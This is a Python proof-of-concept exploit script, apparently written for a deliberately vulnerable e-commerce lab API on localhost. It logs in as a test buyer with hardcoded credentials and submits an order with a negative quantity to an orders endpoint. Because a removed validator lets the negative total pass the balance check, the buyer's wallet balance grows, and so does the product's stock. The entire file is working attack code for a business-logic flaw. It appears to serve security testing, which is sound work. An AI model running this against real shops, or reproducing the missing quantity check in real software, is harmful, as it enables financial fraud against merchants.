#!/usr/bin/env python3
"""
BL-1 — Negative Quantity Order → Wallet Inflation + Inventory Increase
Endpoint: POST /api/orders
Auth    : Any buyer

The gt=0 validator was removed from OrderItemCreate.quantity.
Ordering a negative quantity causes:
  - total_amount = price * negative_qty  →  negative total
  - wallet balance check: balance < negative_total  →  always False → passes
  - deduct_for_purchase: balance -= negative_total  →  balance INCREASES
  - product.quantity -= negative_qty               →  inventory INCREASES

Result: buyer's wallet grows with each order, seller's inventory grows too.

Usage
-----
    python poc_010_negative_quantity_wallet_inflation.py
    python poc_010_negative_quantity_wallet_inflation.py --qty -10 --product 1
"""

import argparse
import sys
import requests

BUYER_EMAIL    = "charlie@mercury.com"
BUYER_PASSWORD = "Buyer123!"
PRODUCT_ID     = 1


def banner():
    print("=" * 60)
    print("  BL-1 — Negative Quantity → Wallet Inflation")
    print("  Endpoint: POST /api/orders")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed"); sys.exit(1)
    return token


def get_balance(base_url, token):
    resp = requests.get(f"{base_url}/api/wallet",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()["balance"]


def get_product(base_url, token, product_id):
    resp = requests.get(f"{base_url}/api/products/{product_id}",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()


def place_order(base_url, token, product_id, quantity):
    resp = requests.post(f"{base_url}/api/orders",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"items": [{"product_id": product_id, "quantity": quantity}],
                               "shipping_address": "exploit"}, timeout=10)
    return resp


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--product", type=int, default=PRODUCT_ID)
    parser.add_argument("--qty", type=int, default=-5)
    args = parser.parse_args()

    banner()
    token = login(args.url, BUYER_EMAIL, BUYER_PASSWORD)
    print(f"[+] Authenticated as {BUYER_EMAIL}")

    product = get_product(args.url, token, args.product)
    print(f"[*] Product: '{product['title']}' @ ${product['price']:.4f} | stock={product['quantity']}")

    balance_before = get_balance(args.url, token)
    print(f"[*] Wallet before: ${balance_before:.2f}")
    print(f"[*] Placing order: quantity={args.qty}  →  expected total = ${product['price'] * args.qty:.4f}")
    print()

    resp = place_order(args.url, token, args.product, args.qty)
    if resp.status_code in (200, 201):
        data = resp.json()
        balance_after = get_balance(args.url, token)
        gained = balance_after - balance_before
        print(f"[+] Order accepted! total_amount={data['total_amount']}")
        print(f"[+] Wallet after : ${balance_after:.2f}  (gained ${gained:.2f})")

        product_after = get_product(args.url, token, args.product)
        print(f"[+] Product stock: {product['quantity']} → {product_after['quantity']}  (increased by {product_after['quantity'] - product['quantity']})")
    else:
        print(f"[-] {resp.status_code}: {resp.json().get('detail')}")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
